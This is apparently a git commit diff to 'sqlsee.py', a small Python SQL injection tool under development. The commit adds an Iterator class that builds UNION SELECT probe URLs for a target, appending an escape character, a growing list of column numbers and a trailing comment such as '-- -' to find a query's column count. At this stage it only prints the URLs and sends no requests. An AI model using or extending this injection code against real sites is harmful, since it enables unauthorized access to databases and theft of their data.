15ac9ff640e1306a1a1ffbf0f06d1c4b92a4e66e
G3N3RA710N-L0CU57 <m.jenkins.software@gmail.com>
2022-11-22 13:30:59 -0500

    Iterator building full url

--- sqlsee.py
+++ sqlsee.py
@@ -6,7 +6,7 @@ import gzip
 ###### HTTP request ######
 
 class HTTPrequest():
-""" Sends HTTP request and retrieves response. """
+    """ Sends HTTP request and retrieves response. """
 
     def __init__(self, url, header, data=None):
         self.url = url
@@ -17,7 +17,7 @@ class HTTPrequest():
 
 
     def send_request(self):
-    """ Send HTTP request and decompress response if gzip compressed. """
+        """ Send HTTP request and decompress response if gzip compressed. """
         with urllib.request.urlopen(self.request) as response:
             self.response = response.read()
             # Check if gzip compressed.
@@ -25,11 +25,11 @@ class HTTPrequest():
                 self.response = gzip.decompress(self.response)
 
     def get_response(self):
-    """ Return HTTP response. """
+        """ Return HTTP response. """
         return self.response
 
     def _format_header(self, header):
-    """ Format list of headers input from cli and return a dict.  """
+        """ Format list of headers input from cli and return a dict.  """
         self.header_list = header.split(", ")
         self.header_dict = dict()
         for i in range(len(self.header_list)):
@@ -44,13 +44,19 @@ class HTTPrequest():
 
 class Iterator(HTTPrequest):
 
-    def __init__(self, url, header, data=None, query):
+    def __init__(self, url, header, data=None, first_escape="", query="", last_escape=""):
         super().__init__(url, header, data)
         self.query = query
+        self.first_escape = first_escape
+        self.last_escape = last_escape
 
     def iterate_columns(self):
+        self.delim = ", "
+        self.column = ""
         for i in range(1, 20):
-            self.send_request()
+            self.column += str(i) + self.delim
+            self.new_url = self.url + self.first_escape + self.query + self.column + self.last_escape
+            print('New url: ' + self.new_url)
 
 
 ###### Injection base class ######
@@ -80,15 +86,13 @@ parser = argparse.ArgumentParser()
 
 parser.add_argument("url", help="url of target in format http://x.x.x.x:port/path")
 parser.add_argument("-H", "--header", help="Header values in comma seperated list. See README for formatting. ex. Host: x.x.x.x, Accept: text/html")
-parser.add_argument("-fE", "--first-esc", help="First escape character used in query. ex. -fE '")
-parser.add_argument("-lE", "--last-esc", help="Last escape character used in query, usually a comment. ex. -- -")
+parser.add_argument("-fE", "--firstesc", help="First escape character used in query. ex. -fE '")
+parser.add_argument("-lE", "--lastesc", help="Last escape character used in query, usually a comment. ex. -- -")
 
 ###### Main function ######
 def main():
     args = parser.parse_args()
-    url_obj = HTTPrequest(args.url, args.header)
-    url_obj.send_request()
-    print(url_obj.get_response())
-
+    it = Iterator(args.url, args.header, first_escape=args.firstesc, query=" UNION SELECT ", last_escape=args.lastesc)
+    it.iterate_columns()
 if __name__ == "__main__":
     main()
